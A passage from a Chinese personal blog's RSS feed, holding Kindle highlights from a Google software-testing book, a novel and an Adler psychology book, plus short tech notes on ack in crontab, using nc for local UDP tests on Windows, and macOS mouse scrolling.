--&gt;避免散漫的文字，推荐使用简明的列表。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1993&lt;!-- raw HTML omitted --&gt;不必推销。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1995&lt;!-- raw HTML omitted --&gt;简洁。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1996&lt;!-- raw HTML omitted --&gt;不要把不重要的、无法执行的东西放进测试&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1998&lt;!-- raw HTML omitted --&gt;渐进式的描述（ Make it flow）。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2001&lt;!-- raw HTML omitted --&gt;最终结果应该是测试用例。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2009&lt;!-- raw HTML omitted --&gt;1. A代表特质（ Attribute）&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2010&lt;!-- raw HTML omitted --&gt;在开始测试计划或做 ACC分析的时候，必须先确定该产品对用户、对业务的意义。我们为什么要开发这个东西呢？它能带来什么核心价值？它又靠什么来吸引用户？记住，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2046&lt;!-- raw HTML omitted --&gt;2. C代表组件（ component）组件是系统的名词，在特质被识别之后确定。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2049&lt;!-- raw HTML omitted --&gt;组件是构成待建系统的模块，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2063&lt;!-- raw HTML omitted --&gt;3. C代表能力（ capability）能力是系统的动词，代表着系统在用户指令之下完成的动作。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2095&lt;!-- raw HTML omitted --&gt;能力最重要的一个特点是它的可测试性。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2098&lt;!-- raw HTML omitted --&gt;能力最重要的一个特点是它的可测试性。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2100&lt;!-- raw HTML omitted --&gt;一个能力可以描述任意数量的用例。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2130&lt;!-- raw HTML omitted --&gt;用一系列能力来描述用户故事，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 2142&lt;!-- raw HTML omitted --&gt;确定 Google +的特质、组件和能力。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2193&lt;!-- raw HTML omitted --&gt;风险无处不在——&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2202&lt;!-- raw HTML omitted --&gt;确定风险的过程称为风险分析。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2202&lt;!-- raw HTML omitted --&gt;1.风险分析&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2204&lt;!-- raw HTML omitted --&gt;这些事件发生的可能性有多大？一旦发生，对公司产生多大影响？一旦发生，对客户产生多大影响？产品具备什么缓解措施？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2206&lt;!-- raw HTML omitted --&gt;这些缓解措施有多大可能会失败？处理这些失败的成本有哪些？恢复过程有多困难？事件是一次性问题，还是会再次发生？影响&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2209&lt;!-- raw HTML omitted --&gt;在 Google，我们确定了两个要素：失败频率（ frequency of failure）和影响（ impact）。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2214&lt;!-- raw HTML omitted --&gt;风险发生频率有 4个预定义值。罕见（&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2217&lt;!-- raw HTML omitted --&gt;少见（ seldom）：&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2221&lt;!-- raw HTML omitted --&gt;偶尔（ occasionally）：&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2225&lt;!-- raw HTML omitted --&gt;常见（ often）：&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2229&lt;!-- raw HTML omitted --&gt;测试人员确定每个能力的故障发生频率。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2230&lt;!-- raw HTML omitted --&gt;估计风险影响的方法大致相同，也是从几种偶数取值中选&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2231&lt;!-- raw HTML omitted --&gt;最小（ minimal）：用户甚至不会注意到的问题。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2234&lt;!-- raw HTML omitted --&gt;一些（ some）：可能会打扰到用户的问题。一旦发生，重试或恢复&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2237&lt;!-- raw HTML omitted --&gt;较大（ considerable）：故障导致&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2240&lt;!-- raw HTML omitted --&gt;最大（ maximal）：发生的故障会永久性的损害产品的声誉，并导致用户不再使用它。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2267&lt;!-- raw HTML omitted --&gt;风险不大可能彻底消除。驾驶有风险，但我们仍然会开车出行；旅游有风险，但我们并没有停止旅游。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2285&lt;!-- raw HTML omitted --&gt;在软件开发中，任何一种可以在 10分钟之内完成的事情都是微不足道的，或是本来就不值得做的。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2323&lt;!-- raw HTML omitted --&gt;风险分析是一个独立的领域，在许多其他行业里被严肃地对待。我们现在采用的是一个轻量级的版本，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2325&lt;!-- raw HTML omitted --&gt;风险管理方法），这可以作为进一步学习这一重要课题的起点。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.2 风险 &amp;gt; 位置 2328&lt;!-- raw HTML omitted --&gt;TE有责任理解所有的风险点，并使用他或她可以利用的任何手段予以缓解。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.5 TE的招聘 &amp;gt; 位置 2668&lt;!-- raw HTML omitted --&gt;他们只是在试图破坏软件，还是同时在验证它能正常工作？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.5 TE的招聘 &amp;gt; 位置 2717&lt;!-- raw HTML omitted --&gt;我们需要的是愿意持续学习和成长的人。我们也需要那些带来新鲜思想和经验的人，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.3 与Google Docs测试工程师林赛·韦伯斯特（Lindsay Webster）的访谈 &amp;gt; 位置 3301&lt;!-- raw HTML omitted --&gt;对于一个新项目，我首先要站在用户的角度了解这个产品。有可能的话，我会作为一个用户，以自己的账户和个人数据去使用产品。我努力使自己经历完整的用户体验。一旦有自己的真实数据在里面，你对一个产品的期待会彻底改变。在具备了用户心态之后，我会做下面的一些事情。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.3 与Google Docs测试工程师林赛·韦伯斯特（Lindsay Webster）的访谈 &amp;gt; 位置 3362&lt;!-- raw HTML omitted --&gt;遗漏到客户的 bug是一项重要指标，我希望这个数字接近 0。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.3 与Google Docs测试工程师林赛·韦伯斯特（Lindsay Webster）的访谈 &amp;gt; 位置 3377&lt;!-- raw HTML omitted --&gt;或者用户场景无需编写、自动到位。 CRUD操作（译注： create、 read、 update、 delete）&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.3 与Google Docs测试工程师林赛·韦伯斯特（Lindsay Webster）的访谈 &amp;gt; 位置 3385&lt;!-- raw HTML omitted --&gt;团队在推出一个产品或新功能时难免感到提心吊胆，而我能带给他们镇定和信心，这使我感到自己是一种正面、有益的力量。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.4 与YouTube测试工程师安普·周（Apple Chow）的访谈 &amp;gt; 位置 3416&lt;!-- raw HTML omitted --&gt;而 Google的 SET必须写代码，这是他们的工作。这里也很难找到不会写代码的 TE。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.4 与YouTube测试工程师安普·周（Apple Chow）的访谈 &amp;gt; 位置 3426&lt;!-- raw HTML omitted --&gt;Google的测试与其他公司的相同之处呢？ Apple：在测试上难以自动化的软件，很难成为好的软件。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.4 与YouTube测试工程师安普·周（Apple Chow）的访谈 &amp;gt; 位置 3493&lt;!-- raw HTML omitted --&gt;不管是测试框架还是测试用例都以简单为要，随着项目的开展再迭代的设计。不要试图事先解决所有问题。要敢于扔掉过时的东西。&lt;!-- raw HTML omitted --&gt;第4章 测试工程经理&lt;!-- raw HTML omitted --&gt;标注(黄色) - 4.8 搜索和地理信息测试总监Shelton Mar的访谈 &amp;gt; 位置 3989&lt;!-- raw HTML omitted --&gt;把测试推向上游，让整个团队（开发 +测试）为交付的质量负责。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 4.8 搜索和地理信息测试总监Shelton Mar的访谈 &amp;gt; 位置 4025&lt;!-- raw HTML omitted --&gt;从那以后，我们把配置变更也纳入质量流程中，我们开发了一套自动化测试，每次数据和配置变更时都要执行。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 4.11 工程经理Brad Green访谈 &amp;gt; 位置 4219&lt;!-- raw HTML omitted --&gt;Google聘用的都是有极端自我驱动力的家伙。“&lt;!-- raw HTML omitted --&gt;标注(黄色) - 4.12 James Whittaker访谈 &amp;gt; 位置 4339&lt;!-- raw HTML omitted --&gt;先虚心学习，再在一线作出成绩，然后开始寻求创新的方法。&lt;!-- raw HTML omitted --&gt;第5章 Google软件测试改进&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 4398&lt;!-- raw HTML omitted --&gt;Google的测试流程可以非常简练地概括为：&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 4398&lt;!-- raw HTML omitted --&gt;让每个工程师都注重质量。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 4398&lt;!-- raw HTML omitted --&gt;只要大家诚实认真地这么做，质量就会提高。代码质量从一开始就能更好，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.1 Google流程中的致命缺陷 &amp;gt; 位置 4408&lt;!-- raw HTML omitted --&gt;可是测试并不能保证质量。质量是内建的，而不是外加的。因此，保证质量是开发者的任务，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.1 Google流程中的致命缺陷 &amp;gt; 位置 4409&lt;!-- raw HTML omitted --&gt;测试成了开发的拐杖。我们越不让开发考虑测试的问题，把测试变得越简单，开发就越来越不会去做测试。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.1 Google流程中的致命缺陷 &amp;gt; 位置 4415&lt;!-- raw HTML omitted --&gt;保证质量不但是别人的问题，它甚至还属于另一个部门。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.1 Google流程中的致命缺陷 &amp;gt; 位置 4416&lt;!-- raw HTML omitted --&gt;出问题的时候也很容易就把责任推卸给修前草坪的外包公司。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.1 Google流程中的致命缺陷 &amp;gt; 位置 4426&lt;!-- raw HTML omitted --&gt;第三个致命的缺陷，是测试人员往往崇拜测试产物（ test artifact）胜过软件本身。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.1 Google流程中的致命缺陷 &amp;gt; 位置 4430&lt;!-- raw HTML omitted --&gt;所有测试产物的价值，在于它们对代码的影响，进而通过产品来体现。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.2 SET的未来 &amp;gt; 位置 4447&lt;!-- raw HTML omitted --&gt;简单来说，我们认为 SET没有未来。 SET就是开发。就这么简单。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 5.2 SET的未来 &amp;gt; 位置 4450&lt;!-- raw HTML omitted --&gt;SET直接负责很多功能特性，如可测试性、可靠性、可调试性，&lt;/p&gt;</description>
    </item>
    <item>
      <title>沉默的病人（世界狂销300万册的烧脑神作！多少看似完美的夫妻，都在等待杀死对方的契机）</title>
      <link>https://wdd.js.org/posts/2021/07/rgx3g5/</link>
      <pubDate>Thu, 08 Jul 2021 08:58:49 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/07/rgx3g5/</guid>
      <description>&lt;p&gt;沉默的病人（世界狂销300万册的烧脑神作！多少看似完美的夫妻，都在等待杀死对方的契机）&lt;!-- raw HTML omitted --&gt;亚历克斯·麦克利兹&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;第二部分 PAPT TWO&lt;!-- raw HTML omitted --&gt;标注(黄色) - 9 &amp;gt; 位置 1294&lt;!-- raw HTML omitted --&gt;选择自己所爱的人就像选择心理治疗师，”鲁思说，“我们有必要问自己，这个人会不会对我忠诚，能不能听得进批评，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 9 &amp;gt; 位置 1295&lt;!-- raw HTML omitted --&gt;承认所犯的错误，而且做不到的事情决不承诺？”&lt;!-- raw HTML omitted --&gt;第三部分 PAPT THREE&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 2577&lt;!-- raw HTML omitted --&gt;虽然我生来不是个好人，有时我却偶然要做个好人。——威廉·莎士比亚《冬天的故事》[&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ack 在contab中无法查到关键词</title>
      <link>https://wdd.js.org/shell/contab-ack/</link>
      <pubDate>Fri, 18 Jun 2021 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/shell/contab-ack/</guid>
      <description>&lt;p&gt;手工执行，可以获得预期结果，但是在crontab中，却查不到结果。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;stage_count=$(ack -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终使用&lt;code&gt;--nofilter&lt;/code&gt;参数，解决了问题。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;stage_count=$(ack --nofilter -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline&#34;&gt;https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>被讨厌的勇气：“自我启发之父”阿德勒的哲学课</title>
      <link>https://wdd.js.org/posts/2021/06/ineayu/</link>
      <pubDate>Wed, 16 Jun 2021 13:47:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/06/ineayu/</guid>
      <description>&lt;p&gt;引言&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 225&lt;!-- raw HTML omitted --&gt;人并不是住在客观的世界，而是住在自己营造的主观世界里。&lt;!-- raw HTML omitted --&gt;第一夜 我们的不幸是谁的错？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 不为人知的心理学“第三巨头” &amp;gt; 位置 335&lt;!-- raw HTML omitted --&gt;但在世界上，阿德勒是与弗洛伊德、荣格并列的三大巨头之一。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 再怎么“找原因”，也没法改变一个人 &amp;gt; 位置 377&lt;!-- raw HTML omitted --&gt;如果所有人的“现在”都由“过去”所决定，那岂不是很奇怪吗？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 再怎么“找原因”，也没法改变一个人 &amp;gt; 位置 384&lt;!-- raw HTML omitted --&gt;您是说与过去没有关系？哲人：是的，这就是阿德勒心理学的立场。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 再怎么“找原因”，也没法改变一个人 &amp;gt; 位置 389&lt;!-- raw HTML omitted --&gt;阿德勒心理学考虑的不是过去的“原因”，而是现在的“目的”。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 心理创伤并不存在 &amp;gt; 位置 417&lt;!-- raw HTML omitted --&gt;任何经历本身并不是成功或者失败的原因。我们并非因为自身经历中的刺激——所谓的心理创伤——而痛苦，事实上我们会从经历中发现符合自己目的的因素。决定我们自身的不是过去的经历，而是我们自己赋予经历的意义。”&lt;!-- raw HTML omitted --&gt;标注(黄色) - 心理创伤并不存在 &amp;gt; 位置 423&lt;!-- raw HTML omitted --&gt;人生不是由别人赋予的，而是由自己选择的，是自己选择自己如何生活。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 心理创伤并不存在 &amp;gt; 位置 443&lt;!-- raw HTML omitted --&gt;我们大家都是在为了某种“目的”而活着。这就是目的论。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 你的不幸，皆是自己“选择”的 &amp;gt; 位置 599&lt;!-- raw HTML omitted --&gt;而是因为你认为“不幸”对你自身而言是一种“善”。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 人们常常下定决心“不改变” &amp;gt; 位置 614&lt;!-- raw HTML omitted --&gt;某人如何看“世界”，又如何看“自己”，把这些“赋予意义的方式”汇集起来的概念就可以理解为生活方式。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 你的人生取决于“当下” &amp;gt; 位置 706&lt;!-- raw HTML omitted --&gt;无论之前的人生发生过什么，都对今后的人生如何度过没有影响。”决定自己人生的是活在“此时此刻”的你自己。&lt;!-- raw HTML omitted --&gt;第二夜 一切烦恼都来自人际关系&lt;!-- raw HTML omitted --&gt;标注(黄色) - 为什么讨厌自己？ &amp;gt; 位置 780&lt;!-- raw HTML omitted --&gt;阿德勒心理学把这叫作“鼓励”。青年：鼓励？&lt;!-- raw HTML omitted --&gt;书签 - 一切烦恼都是人际关系的烦恼 &amp;gt; 位置 834&lt;!-- raw HTML omitted --&gt;标注(黄色) - 自卑情结只是一种借口 &amp;gt; 位置 936&lt;!-- raw HTML omitted --&gt;自卑情结是指把自己的自卑感当作某种借口使用的状态。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 自卑情结只是一种借口 &amp;gt; 位置 943&lt;!-- raw HTML omitted --&gt;外部因果律”一词来进行说明。意思就是：将原本没有任何因果关系的事情解释成似乎有重大因果关系一样。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 人生不是与他人的比赛 &amp;gt; 位置 1044&lt;!-- raw HTML omitted --&gt;健全的自卑感不是来自与别人的比较，而是来自与“理想的自己”的比较。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 在意你长相的，只有你自己 &amp;gt; 位置 1071&lt;!-- raw HTML omitted --&gt;在意你长相的，只有你自己&lt;!-- raw HTML omitted --&gt;标注(黄色) - 人生的三大课题：交友课题、工作课题以及爱的课题 &amp;gt; 位置 1223&lt;!-- raw HTML omitted --&gt;交友课题、工作课题以及爱的课题&lt;!-- raw HTML omitted --&gt;标注(黄色) - 人生的三大课题：交友课题、工作课题以及爱的课题 &amp;gt; 位置 1224&lt;!-- raw HTML omitted --&gt;一切烦恼皆源于人际关系”&lt;!-- raw HTML omitted --&gt;标注(黄色) - 浪漫的红线和坚固的锁链 &amp;gt; 位置 1313&lt;!-- raw HTML omitted --&gt;当人能够感觉到“与这个人在一起可以无拘无束”的时候，才能够体会到爱。既没有自卑感也不必炫耀优越性，能够保持一种平静而自然的状态。真正的爱应该是这样的。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 浪漫的红线和坚固的锁链 &amp;gt; 位置 1315&lt;!-- raw HTML omitted --&gt;束缚是想要支配对方的表现，也是一种基于不信任感的想法。与一个不信任自己的人处在同一个空间里，那就根本不可能保持一种自然状态。&lt;!-- raw HTML omitted --&gt;标注(黄色) - “人生谎言”教我们学会逃避 &amp;gt; 位置 1333&lt;!-- raw HTML omitted --&gt;那并不是因为无法容忍 A的缺点才讨厌他，而是你先有“要讨厌 A”这个目的，之后才找出了符合这个目的的缺点。&lt;!-- raw HTML omitted --&gt;标注(黄色) - “人生谎言”教我们学会逃避 &amp;gt; 位置 1345&lt;!-- raw HTML omitted --&gt;人就是这么任性而自私的生物，一旦产生这种想法，无论怎样都能发现对方的缺点。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 阿德勒心理学是“勇气的心理学” &amp;gt; 位置 1373&lt;!-- raw HTML omitted --&gt;青年：也就是“不在于被给予了什么，而在于如何去使用被给予的东西”那句话吗？&lt;!-- raw HTML omitted --&gt;第三夜 让干涉你生活的人见鬼去&lt;!-- raw HTML omitted --&gt;标注(黄色) - 自由就是不再寻求认可？ &amp;gt; 位置 1405&lt;!-- raw HTML omitted --&gt;就是：“货币是被铸造的自由。”它是陀思妥耶夫斯基的小说中出现的一句话。“被铸造的自由”这种说法是何等的痛快啊！我认为这是一句非常精辟的话，它一语道破了货币的&lt;!-- raw HTML omitted --&gt;标注(黄色) - 自由就是不再寻求认可？ &amp;gt; 位置 1449&lt;!-- raw HTML omitted --&gt;阿德勒心理学否定寻求他人的认可。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 要不要活在别人的期待中？ &amp;gt; 位置 1479&lt;!-- raw HTML omitted --&gt;在犹太教教义中有这么一句话：“倘若自己都不为自己活出自己的人生，那还有谁会为自己而活呢？”你就活在自己的人生中。&lt;!-- raw HTML omitted --&gt;书签 - 要不要活在别人的期待中？ &amp;gt; 位置 1498&lt;!-- raw HTML omitted --&gt;标注(黄色) - 砍断“格尔迪奥斯绳结” &amp;gt; 位置 1689&lt;!-- raw HTML omitted --&gt;否定原因论、否定精神创伤、采取目的论；认为人的烦恼全都是关于人际关系的烦恼；此外，不寻求认可或者课题分离也全都是反常识的理论。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 自由就是被别人讨厌 &amp;gt; 位置 1764&lt;!-- raw HTML omitted --&gt;自由就是被别人讨厌”。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 自由就是被别人讨厌 &amp;gt; 位置 1785&lt;!-- raw HTML omitted --&gt;不畏惧被人讨厌而是勇往直前，不随波逐流而是激流勇进，这才是对人而言的自由。&lt;!-- raw HTML omitted --&gt;第五夜 认真的人生“活在当下”&lt;!-- raw HTML omitted --&gt;标注(黄色) - 对决“人生最大的谎言” &amp;gt; 位置 2910&lt;!-- raw HTML omitted --&gt;人生中最大的谎言就是不活在“此时此刻”。纠结过去、关注未来，把微弱而模糊的光打向人生整体，自认为看到了些什么。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 对决“人生最大的谎言” &amp;gt; 位置 2916&lt;!-- raw HTML omitted --&gt;因为过去和未来根本不存在，所以才要谈现在。起决定作用的既不是昨天也不是明天，而是“此时此刻”。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 人生的意义，由你自己决定 &amp;gt; 位置 2982&lt;!-- raw HTML omitted --&gt;必须有人开始。即使别人不合作，那也与你无关。我的意见就是这样。应该由你开始，不用去考虑别人是否合作。”&lt;!-- raw HTML omitted --&gt;后记&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 3011&lt;!-- raw HTML omitted --&gt;一切烦恼皆源于人际关系”“人可以随时改变并能够获得幸福”“问题不在于能力而在于勇气&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows版本nc教程：在windows上做udp测试</title>
      <link>https://wdd.js.org/posts/2021/06/ex5n9h/</link>
      <pubDate>Wed, 16 Jun 2021 13:31:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/06/ex5n9h/</guid>
      <description>&lt;p&gt;有时候，客户端的udp包被中间的防火墙拦截了，在linux上可以很简单的用nc启动一个udp server&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;启动udp&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;server&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;监听8888端口&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;nc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ulp&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;启动udp&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;nc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;u&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在linux上启动nc udp server很简单，但是在windows上，没办法安装nc啊？😭&lt;/p&gt;
&lt;h1 id=&#34;峰回路转&#34;&gt;峰回路转&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nmap.org/download.html&#34;&gt;https://nmap.org/download.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在查看了nc的官网之后，发现nc实际上也提供了windows的程序，有两种版本。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有GUI界面的，使用友好，安装包比较大 &lt;a href=&#34;https://nmap.org/dist/nmap-7.91-setup.exe&#34;&gt;https://nmap.org/dist/nmap-7.91-setup.exe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;仅仅在命令行下执行，刚好满足需求  &lt;a href=&#34;https://nmap.org/dist/nmap-7.91-win32.zip&#34;&gt;https://nmap.org/dist/nmap-7.91-win32.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看看带GUI界面的&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/06/ex5n9h/2022-10-29-19-47-29.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;附件&#34;&gt;附件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2021/zip/280451/1623822081147-3d08abd7-dd5b-44c5-a614-5efae58c131f.zip?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2021%2Fzip%2F280451%2F1623822081147-3d08abd7-dd5b-44c5-a614-5efae58c131f.zip%22%2C%22name%22%3A%22nmap-7.91-win32.zip%22%2C%22size%22%3A15303896%2C%22type%22%3A%22application%2Fzip%22%2C%22ext%22%3A%22zip%22%2C%22status%22%3A%22done%22%2C%22taskId%22%3A%22u9c45e4b6-d2b6-458f-8fc3-a8fc5dd3563%22%2C%22taskType%22%3A%22upload%22%2C%22id%22%3A%22uef5519c9%22%2C%22card%22%3A%22file%22%7D&#34;&gt;nmap-7.91-win32.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>macos 鼠标滚轮不灵敏</title>
      <link>https://wdd.js.org/posts/2021/06/ismran/</link>
      <pubDate>Wed, 16 Jun 2021 13:27:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/06/ismran/</guid>
      <description>&lt;h1 id=&#34;现象&#34;&gt;现象&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;有时候轻微滚动滚轮，页面不滚动，然后突然又发生了滚动&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;解决方案-mos&#34;&gt;解决方案 Mos&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Caldis/Mos&#34;&gt;https://github.com/Caldis/Mos&lt;/a&gt;&lt;/li&gt;
